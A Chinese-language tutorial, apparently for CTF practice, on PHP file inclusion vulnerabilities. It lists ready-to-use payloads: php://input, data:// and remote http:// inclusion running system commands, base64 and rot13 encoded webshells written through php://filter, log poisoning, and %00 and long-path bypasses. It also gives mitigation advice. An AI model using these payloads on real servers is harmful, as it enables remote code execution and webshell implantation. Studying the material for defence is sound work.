# 文件包含漏洞原理

什么是文件包含

为了让代码有更好的可复用性，引入了文件包含函数，通过文件包含函数，包含进来文件，可以直接使用包含进来的文件的代码例如C++的include,java等的import

```
<?php
	$filename=$_GET['filename'] ;
	include($filename);
?>
```

```
php引发文件包含漏洞的四个函数:
include()
include_once()
require()
require_once() 
```

各类脚本语言包含代码写法-见下文

```
<!--#include file="1.asp" -->

<!--#include file="top.aspx" -->

<c:import url="http://thief.one/1.jsp">

<jsp:include page="head.jsp"/>

<%@ include file="head.jsp"%>

<?php Include('test.php')?>
```

本地文件包含

- 可以包含本地文件，在条件允许时甚至能执行代码
- 读敏感文件，读PHP文件
- 包含日志文件GetShell
- 包含data:或php://input等伪协议
- 若有phpinfo则可以包含临时文件
- 配合上传图片马，然后包含从而GetShell

![img](http://image.daishen.ltd/i/2023/03/07/6406de1089a80.png)

远程文件包含

如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。

# 具体使用

### php&http协议

```
payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php

payload: ?file=php://input post:<?php system('tac flag.php');?>

payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

### data&http协议

```
payload: ?file=data://text/plain,<?=system('tac flag.*');?>

payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==

payload: ?file=http://www.xiaodi8.com/1.txt 1.txt:<?php system('tac flag.php');?>
```

### 日志包含

1、利用其他协议,如file,zlib等

2、利用日志记录UA特性包含执行

分析需文件名及带有php关键字放弃

故利用日志记录UA信息，UA带入代码

包含：/var/log/nginx/access.log

### SESSION包含

https://www.cnblogs.com/lnterpreter/p/14086164.html

https://www.cnblogs.com/echoDetected/p/13976405.html



### php://filter/write&加密编码

```
1、利用base64:

url编码2次：php://filter/write=convert.base64-decode/resource=123.php 

content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==

2、利用凯撒13：

url编码2次：php://filter/write=string.rot13/resource=2.php

content=<?cuc riny($_CBFG[1]);?>
```

### data&base64协议

```
过滤PHP，各种符号，php代码编码写出无符号base64值

Payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk
```

### php://filter/write&新的算法

```
convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用

<?php

$result = iconv("UCS-2LE","UCS-2BE", '<?php eval($_POST[a]);?>');

echo "经过一次反转:".$result."\n";

echo "经过第二次反转:".iconv("UCS-2LE","UCS-2BE", $result);

?>

Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php

contents=?<hp pvela$(P_SO[T]a;)>?
```

# 防范措施

包含漏洞在PHP开发中特别常见，综上分析后发现，造成该漏洞的根本原因：**被包含的页面可以被攻击者控制，攻击者可以随心所欲的去包含某个页面。**

**具体防范措施：（可以进行参考）**

> 1、严格判断包含中的参数是否外部可控，因为文件包含漏洞利用成功的关键在于被包含的文件是否可被外部控制。
>
> 2、路径限制：限制被包含文件只能在某一文件夹中，一定要禁止目录跳转字符，如：../
>
> 3、包含文件验证：验证被包含的文件是否在白名单中
>
> 4、尽量不要使用动态包含，可以在需要包含的页面固定写好

# 绕过

绕过限制有很多方法可以实现：

- %00截断
- 长路径截断
- 点点点点点号绕过

### .%00（%00截断）

就是在url后面输入%00 即可截断html，条件： allow_url_fopen = Off php版本<5.3.4

### 长路径截断

条件：windows OS，点号需要长于256；linux OS 长于4096

windows下目录最大长度为256字节，超出的部分会被丢弃

linux下目录最大长度为4096字节，

### 点点点点点点*n绕过（点号截断）

点号绕过的原理和长路径截断的一样：原理是：

windows下目录最大长度为256字节，超出的部分会被丢弃，linux下目录最大长度为4096字节，超出的部分会被丢弃，所以用…..绕过的时候windows 系统中，点号需要长于256；linux 系统中点号要长于4096。
